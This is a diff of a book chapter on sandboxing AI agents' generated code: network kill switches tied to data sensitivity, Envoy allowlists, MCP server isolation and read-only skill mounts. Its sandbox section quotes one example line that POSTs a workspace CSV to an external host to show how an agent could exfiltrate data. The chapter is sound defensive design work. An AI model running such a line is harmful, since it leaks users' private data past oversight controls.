@@ -10133,6 +10133,14 @@ Tools bridge local agents and remote A2A agents. The `route` tool wraps A2A clie
 
 # Chapter: Execution Infrastructure
 
+## Introduction
+
+Agents that only call tools operate within a controlled vocabulary: each tool has defined inputs, outputs, and permissions. But agents that generate and execute arbitrary code -- the CodeAct pattern, REPL-based reasoning, skill scripts -- need infrastructure that constrains the execution environment itself. This chapter covers the production infrastructure for running agent-generated code safely.
+
+The progression is from general to specific. The Sandbox section introduces the core isolation primitives (process, filesystem, network) including data-sensitivity-driven network control and a conceptual proxy-based design for finer-grained connectivity. The REPL section builds on the sandbox to create a stateful, notebook-like execution environment for iterative code exploration. The MCP Server Isolation section applies the same isolation principles to MCP servers, and the Skill Sandbox section handles the distinct trust model of developer-authored skill scripts.
+
+## Sections
+
 ## Code Sandbox
 
 When agents use the CodeAct pattern -- generating and executing arbitrary code to accomplish tasks -- they need an execution environment that is isolated, recoverable, and auditable. A sandbox provides this environment. It sits between the agent and the host operating system, enforcing boundaries that the agent's code cannot circumvent.
@@ -10141,9 +10149,7 @@ This section describes the concepts and mechanisms behind sandboxed execution. T
 
 ## Why Agents Need Sandboxes
 
-Tool-based agents operate within a controlled vocabulary: each tool has defined inputs, outputs, and permissions (see the `@tool_permission` decorator in our tools module). But CodeAct agents write and run arbitrary code. A Python snippet can open files, make network requests, spawn processes, or modify the filesystem in ways that no tool permission system can anticipate.
-
-The sandbox addresses this by enforcing isolation at the infrastructure level. Rather than trying to restrict what code can do through static analysis or allow-lists (which are brittle and bypassable), the sandbox constrains the environment in which the code runs.
+A Python snippet can open files, make network requests, spawn processes, or modify the filesystem in ways that no tool permission system can anticipate. The sandbox addresses this by enforcing isolation at the infrastructure level. Rather than trying to restrict what code can do through static analysis or allow-lists (which are brittle and bypassable), the sandbox constrains the environment in which the code runs.
 
 ## Process Isolation
 
@@ -10160,7 +10166,10 @@ class SandboxBubblewrap(Sandbox):
             "bwrap",
             "--ro-bind", "/usr", "/usr",
             "--ro-bind", "/lib", "/lib",
+            "--ro-bind", "/lib64", "/lib64",
             "--ro-bind", "/bin", "/bin",
+            "--ro-bind", "/sbin", "/sbin",
+            "--ro-bind", "/etc/resolv.conf", "/etc/resolv.conf",
             "--proc", "/proc",
             "--dev", "/dev",
             "--tmpfs", "/tmp",
@@ -10232,27 +10241,76 @@ A translation layer converts between the agent-visible path (`/workspace/report.
 
 ## Network Isolation
 
-Network access is the primary exfiltration vector for code running inside a sandbox. An agent that has loaded sensitive data into its workspace could POST it to an external server. Tool permissions cannot prevent this because the code runs outside the tool framework.
+Network access is the primary exfiltration vector for code running inside a sandbox. An agent that has loaded sensitive data into its workspace could POST it to an external server. Tool permissions cannot prevent this because the code runs outside the tool framework -- a one-liner like `requests.post("https://external.com", data=open("/workspace/data.csv").read())` bypasses every permission check because it never goes through the tool-calling path.
 
 ### Binary Network Control
 
-The simplest and most auditable approach is a binary choice: the sandbox either has full network access or none at all. On bwrap, `--unshare-net` removes all network interfaces except loopback. On Docker, `network_mode="none"` does the same.
+The simplest and most auditable approach is a binary choice: the sandbox either has full network access or none at all. On bwrap, `--unshare-net` removes all network interfaces except loopback. On Docker, `network_mode="none"` does the same -- no DNS resolution, no TCP connections, no UDP traffic. The container becomes a compute island that can read and write files on its mounted workspace but cannot reach anything beyond `127.0.0.1`.
 
 There is no allow-list, no proxy, no partial access. This eliminates configuration errors and makes the security property trivial to verify.
 
-### Integration with Data Sensitivity
+### Data-Sensitivity-Driven Switching
 
-The network isolation decision can be driven by data classification. When a session processes sensitive data (flagged by connectors via a compliance layer like `PrivateData`), the sandbox automatically disables network access:
+The `PrivateData` compliance module drives the network switch. When a connector retrieves sensitive records -- patient data from a database, financial reports from an internal API -- it calls `PrivateData.add_private_dataset()` to register the dataset and its sensitivity level. The sandbox checks this state and selects the network mode accordingly:
 
 ```python
-isolate_network = session_has_private_data(user_id, session_id)
+class NetworkMode(str, Enum):
+    FULL = "bridge"
+    NONE = "none"
+
+def get_network_mode(user_id: str, session_id: str) -> NetworkMode:
+    if session_has_private_data(user_id, session_id):
+        return NetworkMode.NONE
+    return NetworkMode.FULL
 ```
 
-This is a one-way ratchet: once sensitive data enters a session, the network stays off for the session's lifetime. Sensitivity escalates but never degrades.
+This is a one-way ratchet: once sensitive data enters a session, network access never returns. The sensitivity level can escalate (from INTERNAL to CONFIDENTIAL to SECRET) but never decrease. This mirrors the real-world principle that you cannot "un-see" data -- once an agent has processed confidential records, any subsequent code it generates could embed fragments of that data in network requests.
 
-### Workspace Survival Across Recreation
+### Dynamic Container Recreation
 
-If a running sandbox must be recreated to change its network mode (for example, when private data arrives mid-session), the workspace survives because it lives on the host filesystem. The old sandbox is destroyed, a new one is created with network disabled, and the same workspace directory is mounted again. From the agent's perspective, all files are still present -- only the network has changed.
+The sandbox manager checks `get_network_mode()` on every session access and compares the result against the container's current network mode. If the required mode is more restrictive, the manager stops the container and creates a new one with the correct network configuration.
+
+The workspace directory survives this recreation because it lives on the host filesystem as a bind mount. The old sandbox is destroyed, a new one is created with network disabled, and the same workspace is mounted again. From the agent's perspective, all files are still present -- only network destinations that were previously reachable now return connection errors.
+
+For a better user experience, the system can inject a message into the agent's context when the network mode changes:
+
+```
+[SYSTEM] Network access has been restricted because private data
+entered this session. Outbound connections are blocked.
+```
+
+The agent can then decide to work with the data locally, or ask the user for guidance.
+
+### Beyond Binary: Proxy-Based Selective Connectivity
+
+The binary switch works well when data sensitivity is clear-cut, but enterprise workflows often need to combine private data with trusted external services: an internal company API, a data warehouse behind the VPN, a cloud service with a Zero Data Retention (ZDR) agreement. Cutting all network access forces the agent to stop mid-task whenever it needs to reach one of these services after private data has entered the session.
+
+A more sophisticated approach places a proxy (such as Envoy) between the container and the network. The architecture uses two Docker networks. The first is an internal network with no external route, connecting only the sandbox container and the proxy. The second is the default bridge network that gives the proxy access to the outside world. The sandbox cannot reach the internet directly; it can only reach the proxy, and the proxy decides what traffic to forward based on a platform-level whitelist.
+
+```
+                  internal network              bridge network
+                  (no gateway)                  (internet access)
+
+ +-------------+                 +-------+                    +-----------+
+ |  Sandbox    | --- HTTP(S) --> | Envoy | --- HTTP(S) -->    | Trusted   |
+ |  Container  |                 | Proxy |                    | Services  |
+ +-------------+                 +-------+                    +-----------+
+                                     |
+                                     X--- blocked -->  Untrusted destinations
+```
+
+With this proxy in place, the `NetworkMode` enum gains a third option:
+
+```python
+class NetworkMode(str, Enum):
+    FULL = "bridge"
+    PROXIED = "proxied"   # whitelist-only via proxy
+    NONE = "none"
+```
+
+The mode selection then considers the sensitivity level: PUBLIC and INTERNAL data get full access, CONFIDENTIAL data triggers proxied mode, and SECRET data triggers the full network kill. The ratchet behavior still applies.
+
+This proxy-based approach is not implemented in our POC. The binary FULL/NONE switch covers the most common scenarios and is simple to deploy and audit. The proxy pattern is presented here as a design direction for production deployments where blanket network removal is too restrictive.
 
 ## Timeout Enforcement
 
@@ -10325,13 +10383,25 @@ The sandbox is one layer in a defense-in-depth approach to agent security:
 2. **Sandbox isolation** constrains what the agent's generated code can do at the infrastructure level -- filesystem, network, process, and resource boundaries.
 3. **Data compliance** drives sandbox configuration automatically, tightening isolation when sensitive data enters a session.
 
-These layers are independent. Tool permissions cannot prevent code from making network requests inside a sandbox. Sandbox network isolation cannot prevent a tool from calling an external API. Together, they cover both vectors without relying on the agent's cooperation.
+These layers are independent and protect against different vectors:
+
+```
+Agent
+  |
+  |-- Tool call path
+  |     @tool_permission(CONNECT) blocks exfiltration tools
+  |
+  |-- Code execution path (sandbox)
+        Network isolation blocks network at infrastructure level
+```
+
+Neither layer depends on the other. Tool permissions cannot prevent code from making network requests inside a sandbox. Sandbox network isolation cannot prevent a tool from calling an external API. Together with the `PrivateData` compliance module that drives both layers, the system provides a coherent data protection pipeline: connectors tag data as it enters the session, tool permissions restrict the agent's tool vocabulary, and the sandbox restricts the network reach. A failure or misconfiguration in one layer does not expose data through the other.
 
 ## Design Trade-offs
 
 **One sandbox per session** simplifies lifecycle management (no shared state, no cross-session interference) but costs more resources than pooling. For strong isolation, this trade-off is worthwhile.
 
-**Binary network control** (full access or none) is less flexible than allow-lists or proxies, but eliminates configuration errors and is easy to audit.
+**Binary network control** (full access or none) is the default, with proxy-based selective connectivity available as a production extension for workflows that require it.
 
 **Pickle IPC** supports rich Python objects but introduces deserialization risks. The temp directory is short-lived and mounted read-write only for the duration of execution, limiting the attack surface.
 
@@ -10341,12 +10411,6 @@ These layers are independent. Tool permissions cannot prevent code from making n
 ## REPL
 
 The REPL pattern enables an agent to iteratively execute code in a shared, stateful environment, providing immediate feedback while preserving the illusion of a continuous execution context.
-
-### Historical perspective
-
-The REPL (Read-Eval-Print Loop) is one of the oldest interaction models in computing. It emerged in the 1960s with interactive Lisp systems, where programmers could incrementally define functions, evaluate expressions, and inspect results without recompiling entire programs. This interactive style strongly influenced later environments such as Smalltalk workspaces and, decades later, Python and MATLAB shells.
-
-In the context of AI systems, early program synthesis and symbolic reasoning tools already relied on REPL-like loops to test hypotheses and refine partial solutions. More recently, the rise of notebook environments and agentic systems has renewed interest in REPL semantics as a way to let models explore, test, and refine code through execution. The key research shift has been from "single-shot" code generation to **execution-aware reasoning**, where intermediate results guide subsequent steps.
 
 ### The REPL pattern in agentic systems
 
@@ -10471,195 +10535,21 @@ Persistence also enables secondary capabilities. The notebook can be exported to
 
 ### Best practices distilled
 
-Several best practices consistently emerge when implementing REPLs for agents:
+Several best practices consistently emerge when implementing REPLs for agents.
 
-* Prefer process-level isolation over threads for safety and control.
-* Add a sandbox layer (bubblewrap, containers, or similar) beyond simple subprocess isolation.
-* Use pickle-based IPC through the filesystem for subprocess communication.
-* Serialize only data, not execution artifacts; replay imports and functions explicitly.
-* Provide actionable feedback when objects cannot persist across cells.
-* Treat outputs as structured, typed objects with separate storage for binary data.
-* Capture the last expression's value to match the interactive notebook convention.
-* Make execution asynchronous at the API level via thread offloading.
-* Persist state frequently to support recovery and reproducibility.
-* Impose explicit limits on execution time and resource usage.
-* Consider data-driven security policies such as automatic network isolation for sensitive sessions.
+Prefer process-level isolation over threads for safety and control, and add a sandbox layer (bubblewrap, containers, or similar) beyond simple subprocess isolation. Use pickle-based IPC through the filesystem for subprocess communication, serializing only data -- not execution artifacts -- and replaying imports and functions explicitly. When objects cannot persist across cells, provide actionable feedback so the agent or user knows how to recover.
+
+Treat outputs as structured, typed objects with separate storage for binary data, and capture the last expression's value to match the interactive notebook convention. Make execution asynchronous at the API level via thread offloading so the host process remains responsive.
+
+Persist state frequently to support recovery and reproducibility. Impose explicit limits on execution time and resource usage. Consider data-driven security policies such as automatic network isolation for sensitive sessions.
 
 Together, these patterns allow agents to reason *through execution* without compromising system stability.
 
-### References
-
-1. McCarthy, J. *LISP 1.5 Programmer's Manual*. MIT Press, 1962.
-2. Abelson, H., Sussman, G. J., Sussman, J. *Structure and Interpretation of Computer Programs*. MIT Press, 1996.
-3. Kluyver, T. et al. *Jupyter Notebooks -- a publishing format for reproducible computational workflows*. IOS Press, 2016.
-4. Chen, M. et al. *Evaluating Large Language Models Trained on Code*. arXiv, 2021.
-
-
-## Kill switch
-
-When an agent executes arbitrary code inside a sandbox, the tool permission system cannot enforce boundaries. The `@tool_permission` decorator with `CONNECT` checks whether the agent is *allowed* to call a tool, but it has no authority over what happens inside a Docker container where the agent runs Python, shell commands, or any other language. A one-liner `requests.post("https://external.com", data=open("/workspace/data.csv").read())` bypasses every permission check because it never goes through the tool-calling path. The sandbox section describes how `network_mode="none"` addresses this by removing the container's network stack entirely when private data enters the session. This section steps back and examines the broader design: how to build a network kill switch that can operate at different levels of granularity, and how to make it dynamic enough to activate mid-conversation without disrupting the agent's work.
-
-### The binary switch
-
-The simplest form of the kill switch is a binary choice: full network access or no network access at all. Docker's `network_mode="none"` implements this by stripping every network interface from the container except loopback. No DNS resolution, no TCP connections, no UDP traffic. The container becomes a compute island that can read and write files on its mounted workspace but cannot reach anything beyond `127.0.0.1`.
-
-The `PrivateData` compliance module drives this switch. When a connector retrieves sensitive records -- patient data from a database, financial reports from an internal API -- it calls `PrivateData.add_private_dataset()` to register the dataset and its sensitivity level. The sandbox manager checks this state on every session access. If the session has private data and the container still has full network access, the manager stops the container and creates a new one with `network_mode="none"`, mounting the same workspace directory so files survive the transition.
-
-```python
-class NetworkMode(str, Enum):
-    FULL = "bridge"
-    NONE = "none"
-
-def get_network_mode(user_id: str, session_id: str) -> NetworkMode:
-    if session_has_private_data(user_id, session_id):
-        return NetworkMode.NONE
-    return NetworkMode.FULL
-```
-
-This transition is a one-way ratchet. Once private data enters the session, network access never returns. The sensitivity level can escalate (from INTERNAL to CONFIDENTIAL to SECRET) but never decrease, and the network stays off for the remainder of the session's lifetime. This mirrors the real-world principle that you cannot "un-see" data -- once an agent has processed confidential records, any subsequent code it generates could embed fragments of that data in network requests.
-
-The binary switch works well for sessions where the data sensitivity is clear-cut. A session analyzing anonymized public datasets runs with full network access. A session processing patient records runs with no network at all. The decision is simple, auditable, and impossible to circumvent from inside the container.
-
-### The problem with binary
-
-The limitation of the binary switch becomes apparent in mixed workflows. An enterprise agent often needs to combine private data with external services that are themselves trusted: an internal company API, a data warehouse behind the VPN, a cloud service with a Zero Data Retention (ZDR) agreement that guarantees no data is stored or logged on the provider's side. Cutting all network access forces the agent to stop mid-task whenever it needs to reach one of these services after private data has entered the session.
-
-Consider a concrete scenario. The agent queries an internal database to retrieve employee compensation data (confidential). It then needs to call an internal payroll API to validate some of the figures. Both systems are internal, both are trusted, and no data leaves the company perimeter. With the binary kill switch, the agent cannot make the API call because all network access was revoked when the compensation data entered the session.
-
-The tension is between safety and utility. Blocking everything is safe but overly restrictive. Allowing everything is useful but dangerous. What we need is selective connectivity: allow the container to reach trusted endpoints while blocking everything else.
-
-### Envoy proxy for selective connectivity
-
-The solution is to place an Envoy proxy between the container and the network, and route all outbound traffic through it. The proxy holds a whitelist of allowed destinations. Requests to whitelisted URLs pass through; everything else is rejected. The container itself has network access, but only through the proxy, and the proxy enforces which destinations are reachable.
-
-The architecture uses two Docker networks. The first is an internal network with no external route, connecting only the sandbox container and the Envoy proxy container. The second is the default bridge network that gives the proxy container access to the outside world. The sandbox container cannot reach the internet directly because its only network has no gateway. It can only reach the proxy, and the proxy decides what traffic to forward.
-
-```
-                  internal network              bridge network
-                  (no gateway)                  (internet access)
-
- +-------------+                 +-------+                    +-----------+
- |  Sandbox    | --- HTTP(S) --> | Envoy | --- HTTP(S) -->    | Trusted   |
- |  Container  |                 | Proxy |                    | Services  |
- +-------------+                 +-------+                    +-----------+
-                                     |
-                                     X--- blocked -->  Untrusted destinations
-```
-
-The Envoy configuration defines the allowed destinations as clusters and routes. A route matching an allowed domain forwards the request to its cluster. A default route returns 403 Forbidden. The configuration can be as simple as a list of allowed hostnames, or as granular as path-level rules.
-
-```yaml
-# Simplified Envoy route configuration
-virtual_hosts:
-  - name: allowed
-    domains: ["*"]
-    routes:
-      - match: { prefix: "/" }
-        route: { cluster: payroll_api }
-        request_headers_to_add:
-          - header: { key: "x-envoy-upstream-rq-timeout-ms", value: "5000" }
-      - match: { prefix: "/" }
-        direct_response:
-          status: 403
-          body: { inline_string: "Destination not in allowlist" }
-
-clusters:
-  - name: payroll_api
-    type: STRICT_DNS
-    load_assignment:
-      endpoints:
-        - lb_endpoints:
-            - endpoint:
-                address:
-                  socket_address: { address: "payroll.internal.corp", port_value: 443 }
-```
-
-The whitelist is not per-session. It is a platform-level configuration that defines which external services the organization trusts enough to receive data from agent sessions. Typical entries include internal APIs, data warehouses, cloud services with ZDR contracts, and monitoring endpoints. The list is maintained by the platform team, not by the agent or the user, and changes to it follow the same review process as any infrastructure configuration.
-
-### Three network modes
-
-With the proxy in place, the `NetworkMode` enum gains a third option:
-
-```python
-class NetworkMode(str, Enum):
-    FULL = "bridge"
-    PROXIED = "proxied"
-    NONE = "none"
-```
-
-The mode selection now considers both the presence of private data and the sensitivity level. PUBLIC and INTERNAL data require no restriction -- the session runs with full network access. CONFIDENTIAL data triggers the proxied mode, routing traffic through Envoy so the agent can still reach trusted services but nothing else. SECRET data triggers the full kill switch with no network access whatsoever.
-
-```python
-def get_network_mode(user_id: str, session_id: str) -> NetworkMode:
-    pd = PrivateData(user_id, session_id)
-    if not pd.has_private_data:
-        return NetworkMode.FULL
-    match pd.sensitivity:
-        case DataSensitivity.PUBLIC | DataSensitivity.INTERNAL:
-            return NetworkMode.FULL
-        case DataSensitivity.CONFIDENTIAL:
-            return NetworkMode.PROXIED
-        case DataSensitivity.SECRET:
-            return NetworkMode.NONE
-```
-
-The ratchet behavior still applies. Sensitivity can escalate from CONFIDENTIAL to SECRET mid-session, causing the container to be recreated with a more restrictive network mode. It cannot go the other direction. A session that was proxied can become fully isolated, but a fully isolated session never regains connectivity.
-
-### Dynamic switching
-
-The dynamic switch is the same mechanism described in the sandbox section, extended to handle three modes instead of two. The sandbox manager checks `get_network_mode()` on every `get_or_create_session()` call and compares the result against the container's current network mode. If the required mode is more restrictive than the current mode, the manager stops the container and creates a new one with the correct network configuration, reattaching the workspace volume.
-
-```python
-_MODE_SEVERITY = {NetworkMode.FULL: 0, NetworkMode.PROXIED: 1, NetworkMode.NONE: 2}
-
-def _ensure_network_mode(self, session: Session) -> None:
-    required = get_network_mode(session.user_id, session.session_id)
-    if _MODE_SEVERITY[required] <= _MODE_SEVERITY[session.network_mode]:
-        return
-    self._recreate_container(session, network_mode=required)
-```
-
-The container recreation is transparent to the agent. The workspace directory is a bind mount that survives container lifecycle changes. The agent may notice a brief pause while the new container starts, but all files, intermediate results, and generated code remain in place. From the agent's perspective, the only observable change is that some network destinations that were previously reachable now return errors.
-
-The transition from FULL to PROXIED requires creating the Envoy sidecar if it does not already exist. The sandbox manager launches the proxy container on the internal network, applies the whitelist configuration, and then attaches the new sandbox container to the same internal network. The proxy container can be shared across multiple sandbox sessions if they all operate at the CONFIDENTIAL level, since it is stateless and the whitelist is platform-wide.
-
-### What the agent sees
-
-From the agent's perspective, the kill switch manifests as network errors. Code that tries to reach a blocked destination gets a connection refused (NONE mode) or a 403 response (PROXIED mode). The agent has no mechanism to disable the switch, reconfigure the proxy, or escalate its own network privileges. These controls live outside the container, in infrastructure the agent cannot modify.
-
-For a better user experience, the system can inject a message into the agent's context when the network mode changes, explaining what happened and why. This lets the agent adapt its strategy rather than repeatedly failing on blocked requests.
-
-```
-[SYSTEM] Network access has been restricted because confidential data
-entered this session. Outbound connections are limited to approved
-internal services. External API calls will be blocked.
-```
-
-The agent can then decide to work with the data locally, use an approved service, or ask the user for guidance -- rather than wasting turns on requests that will never succeed.
-
-### Relationship to tool permissions
-
-The kill switch and the tool permission system are independent enforcement layers that protect against different vectors. Tool permissions prevent the agent from calling tools it should not use -- for example, blocking a `CONNECT`-tagged tool when private data is present. The kill switch prevents code inside the sandbox from making network connections that bypass the tool system entirely.
-
-Neither layer depends on the other. An agent session with private data has both protections active simultaneously: tool permissions block the tool-calling path, and the kill switch blocks the code-execution path. This defense-in-depth means that a failure or misconfiguration in one layer does not expose the data through the other.
-
-```
-Agent
-  |
-  |-- Tool call path
-  |     @tool_permission(CONNECT) blocks exfiltration tools
-  |
-  |-- Code execution path (sandbox)
-        Kill switch blocks network at infrastructure level
-        (NONE: all traffic blocked, PROXIED: only whitelist allowed)
-```
-
-Together with the `PrivateData` compliance module that drives both layers, the system provides a coherent data protection pipeline: connectors tag data as it enters the session, tool permissions restrict the agent's tool vocabulary, and the kill switch restricts the sandbox's network reach. Each layer operates at a different level of the stack, and all three activate automatically from the same trigger.
 
 
 ## MCP Server Isolation
 
-MCP servers deserve the same network isolation treatment as code-execution sandboxes. When your agent connects to an MCP server -- particularly one you did not write -- every tool call is an opportunity for arbitrary code to run on the server side. A tool that fetches data from an external API, sends an email, or posts to a webhook can exfiltrate private data just as easily as a line of Python in a REPL sandbox. Running MCP servers inside Docker containers and applying the kill switch pattern from the previous section closes this gap.
+MCP servers deserve the same network isolation treatment as code-execution sandboxes. When your agent connects to an MCP server -- particularly one you did not write -- every tool call is an opportunity for arbitrary code to run on the server side. A tool that fetches data from an external API, sends an email, or posts to a webhook can exfiltrate private data just as easily as a line of Python in a REPL sandbox. Running MCP servers inside Docker containers and applying the network isolation pattern from the Sandbox section closes this gap.
 
 ### Two containers, one server
 
@@ -10705,26 +10595,50 @@ When `url_isolated` is not set, the client always uses `url` regardless of priva
 
 ### Client-side switching
 
-The `get_mcp_client()` function resolves the correct URL at connection time by checking the session's private data status:
+Private data can appear at any point during a session -- a tool call might load sensitive records, or a compliance check might flag content that arrived in the conversation. The MCP client must be able to switch to the isolated instance mid-session, between any two tool calls, without tearing down and reopening connections.
+
+The solution is `MCPServerPrivateData`, which extends `MCPServerStrict` (itself a subclass of PydanticAI's `MCPServerStreamableHTTP`) so it is a drop-in replacement in any toolset list. It holds two `MCPServerStrict` instances -- one for the normal URL, one for the isolated URL -- and opens both when the context is entered. Every call (`list_tools`, `call_tool`, etc.) is delegated through a `_target()` method that checks `session_has_private_data()`. The moment private data appears, all subsequent calls route to the isolated instance. The switch is a one-way ratchet: once triggered, it never reverts, matching the sensitivity escalation semantics in `PrivateData`.
 
 ```python
-def get_mcp_client(
-    name: str,
-    config_path: Path | str | None = None,
-    bearer_token: str | None = None,
-) -> MCPServerStreamableHTTP:
-    settings = _load_mcp_settings(config_path)
-    config = settings.get(name)
+class MCPServerPrivateData(MCPServerStrict):
+    def __init__(self, url: str, url_isolated: str, **kwargs):
+        super().__init__(url=url, **kwargs)
+        self._normal = MCPServerStrict(url=url, **kwargs)
+        self._isolated = MCPServerStrict(url=url_isolated, **kwargs)
+        self._is_isolated = False
 
-    url = config.url
-    if config.url_isolated and session_has_private_data(*get_user_session()):
-        url = config.url_isolated
+    def _target(self) -> MCPServerStrict:
+        if not self._is_isolated:
+            self._is_isolated = session_has_private_data()
+        return self._isolated if self._is_isolated else self._normal
 
-    headers = {"Authorization": f"Bearer {bearer_token}"} if bearer_token else None
-    return MCPServerStreamableHTTP(url=url, timeout=config.read_timeout, headers=headers)
+    async def __aenter__(self):
+        await self._normal.__aenter__()
+        await self._isolated.__aenter__()
+        return self
+
+    async def __aexit__(self, *args):
+        await self._isolated.__aexit__(*args)
+        await self._normal.__aexit__(*args)
+
+    # Every toolset method delegates to _target()
 ```
 
-Because PydanticAI creates a new MCP connection context for each agent run, the switch happens naturally between turns. When private data enters the session mid-conversation, the next agent run picks up the isolated URL automatically. No container recreation or connection teardown is needed on the client side -- it simply points at a different endpoint.
+Both connections are alive for the entire session. There is no reconnection or context teardown at the switch point -- `_target()` simply starts returning the isolated instance instead of the normal one. From PydanticAI's perspective, nothing changed; the toolset object is the same, it just routes internally.
+
+The `get_mcp_client()` factory returns `MCPServerPrivateData` when `url_isolated` is present in config, and a plain `MCPServerStrict` otherwise. Callers do not need to know which variant they got:
+
+```python
+def get_mcp_client(name, config_path=None, bearer_token=None):
+    config = load_mcp_settings(config_path).get(name)
+    headers = {"Authorization": f"Bearer {bearer_token}"} if bearer_token else None
+    if config.url_isolated:
+        return MCPServerPrivateData(
+            url=config.url, url_isolated=config.url_isolated,
+            timeout=config.read_timeout, headers=headers,
+        )
+    return MCPServerStrict(url=config.url, timeout=config.read_timeout, headers=headers)
+```
 
 ### Deploying the containers
 
@@ -10743,7 +10657,7 @@ services:
     volumes: [workspace:/workspace]
 ```
 
-For CONFIDENTIAL data where proxied access is acceptable, the isolated instance can use the same Envoy sidecar pattern described in the kill switch section, attaching it to an internal Docker network with the proxy as the only gateway.
+For CONFIDENTIAL data where proxied access is acceptable, the isolated instance can use the same Envoy sidecar pattern described in the Sandbox section, attaching it to an internal Docker network with the proxy as the only gateway.
 
 ### When to use this pattern
 
@@ -10768,23 +10682,153 @@ The result is two distinct zones inside the container. `/workspace` is the agent
 
 ### Wiring Skills to the Sandbox
 
-The `SandboxManager` receives read-only mounts at construction time. A skill registry maps each skill name to a host directory containing a `scripts/` subdirectory. These are passed as read-only mounts so that every container in every session sees the same skill scripts at the same container paths.
-
-The `run_skill_script` tool function bridges the two systems. It looks up the skill in the registry, resolves the script name to a container path under `/skills/{skill_name}/scripts/{script_name}`, and dispatches execution via `SandboxManager.execute_command`. Python scripts are invoked with `python`, shell scripts with `bash`. The tool returns the exit code and combined output.
+The `create_skill_sandbox_manager()` factory builds a `SandboxManager` with read-only mounts derived from the skill registry. It iterates over all discovered skills, maps each skill's `scripts/` directory to a container path under `/skills/{skill_name}/scripts/`, and passes the result as read-only mounts:
 
 ```python
-container_path = f"/skills/{skill.path.name}/scripts/{script_name}"
+def create_skill_sandbox_manager(registry: SkillRegistry) -> SandboxManager:
+    read_only_mounts = {}
+    for meta in registry.list_all():
+        scripts_dir = meta.path / "scripts"
+        if scripts_dir.exists():
+            read_only_mounts[str(scripts_dir)] = f"{SKILLS_CONTAINER_ROOT}/{meta.path.name}/scripts"
+    return SandboxManager(read_only_mounts=read_only_mounts)
+```
+
+Every container created by this manager -- across all sessions -- sees the same skill scripts at the same container paths.
+
+The `run_skill_script` function bridges the skill registry and the sandbox. It looks up the skill by name, resolves the script to a container path, and dispatches execution via `SandboxManager.execute_command`:
+
+```python
+container_path = f"{SKILLS_CONTAINER_ROOT}/{skill.path.name}/scripts/{script_name}"
 command = f"python {container_path} {args}" if script_name.endswith(".py") else f"bash {container_path} {args}"
 return manager.execute_command(user_id, session_id, command)
 ```
 
-Because `execute_command` calls `get_or_create_session` internally, skill execution benefits from the same lifecycle management, network isolation, and workspace persistence described in previous sections. If the session already has a container, the command runs there. If not, a new container is created with both the writable workspace and the read-only skill mounts. If PrivateData triggers a network ratchet mid-conversation, the recreated container preserves both mount types.
+Because `execute_command` calls `get_or_create_session` internally, skill execution benefits from the same lifecycle management, network isolation, and workspace persistence described in previous sections. If the session already has a container, the command runs there. If not, a new container is created with both the writable workspace and the read-only skill mounts. If `PrivateData` triggers a network ratchet mid-conversation, the recreated container preserves both mount types.
 
 ### Why Read-Only Matters
 
 Without the read-only flag, a compromised or misbehaving agent could rewrite a skill script to inject malicious logic that executes on the next invocation -- either in the same session or, if mounts are shared, in other sessions. The `ro` flag is a filesystem-level guarantee enforced by Docker, not by application code. It does not depend on the agent cooperating or on any permission checks in the Python layer.
 
 This creates a clean trust boundary: developers author skills, the platform mounts them immutably, and the agent can only invoke them as-is. The writable workspace remains available for the agent's own data and generated code, keeping the two trust levels physically separated inside the same container.
+
+
+## Hands-On: MCP Server Isolation
+
+This hands-on walks through `example_mcp_isolation.ipynb`, where an agent connects to a template MCP server through the `MCPServerPrivateData` client. The notebook demonstrates the dual-instance isolation pattern described in the previous section: before private data enters the session, tool calls route to the normal server instance; after a tool flags the session as containing sensitive data, all subsequent calls switch to the isolated instance.
+
+The notebook also exercises several production MCP server requirements in a single flow: workspace path translation, `@context_result()` for large results, `@tool_permission` decorators, error classification with `ToolRetryError`, and server-to-client log forwarding via `ctx.info()`.
+
+### Starting the Servers
+
+The template server lives in `agentic_patterns/mcp/template/`. Before running the notebook, start two instances of the same server on different ports:
+
+```bash
+fastmcp run agentic_patterns/mcp/template/server.py:mcp --transport http --port 8000
+fastmcp run agentic_patterns/mcp/template/server.py:mcp --transport http --port 8001
+```
+
+In production, these would be two Docker containers from the same image -- one on the bridge network, one with `network_mode: "none"` (as shown in the MCP Server Isolation section). For the notebook, two local processes on different ports simulate the same topology without Docker.
+
+### The Template Server
+
+The server itself is minimal. `server.py` calls `create_mcp_server()` from the core library, which returns a `FastMCP` instance with `AuthSessionMiddleware` pre-wired for JWT-based identity propagation. Tools are registered from a separate `tools.py` module:
+
+```python
+mcp = create_mcp_server("template", instructions="Template MCP server with workspace, permissions, and compliance.")
+register_tools(mcp)
+```
+
+The four tools in `tools.py` each demonstrate a different requirement. `read_file` combines `@tool_permission(READ)`, `@context_result()`, and `read_from_workspace()` in a single tool. `write_file` shows workspace writes. `search_records` raises `ToolRetryError` when given an empty query, giving the LLM a chance to correct its arguments. `load_sensitive_dataset` flags the session as containing private data via `PrivateData.add_private_dataset()`, which triggers the client-side isolation switch.
+
+### Connecting via get_mcp_client
+
+The notebook creates the MCP client with a single call:
+
+```python
+server = get_mcp_client("template")
+```
+
+This reads the `config.yaml` entry for the `template` server. Because that entry has both `url` and `url_isolated` configured, the factory returns an `MCPServerPrivateData` instance instead of a plain `MCPServerStrict`:
+
+```yaml
+mcp_servers:
+  template:
+    type: client
+    url: http://localhost:8000/mcp
+    url_isolated: http://localhost:8001/mcp
+    read_timeout: 60
+```
+
+The caller does not need to know which variant it got. `MCPServerPrivateData` is a drop-in replacement for `MCPServerStrict` -- it implements the same interface and can be passed directly as a toolset to `get_agent()`.
+
+### Normal Tool Call
+
+The first agent interaction writes a file to the workspace and reads it back. At this point, `session_has_private_data()` returns `False`, so `MCPServerPrivateData._target()` routes the tool call to the normal instance on port 8000.
+
+```python
+print(f"Private data: {session_has_private_data()}")
+async with agent:
+    result, _ = await run_agent(agent, "Write 'hello world' to /workspace/hello.txt, then read it back.")
+```
+
+The `async with agent` context manager opens both MCP connections (normal and isolated) simultaneously. Both are kept alive for the entire session so that switching between them does not require a reconnection.
+
+The log output shows `ctx.info("Reading file: ...")` messages from the server, delivered through the MCP protocol's `notifications/message` mechanism and forwarded to Python logging by the client's `log_handler`.
+
+### Retryable Error
+
+The second interaction deliberately triggers a `ToolRetryError`. The agent is asked to call `search_records` with an empty string:
+
+```python
+async with agent:
+    result, _ = await run_agent(
+        agent,
+        "Call the search_records tool with an empty string '' as the query argument.",
+        verbose=True,
+    )
+```
+
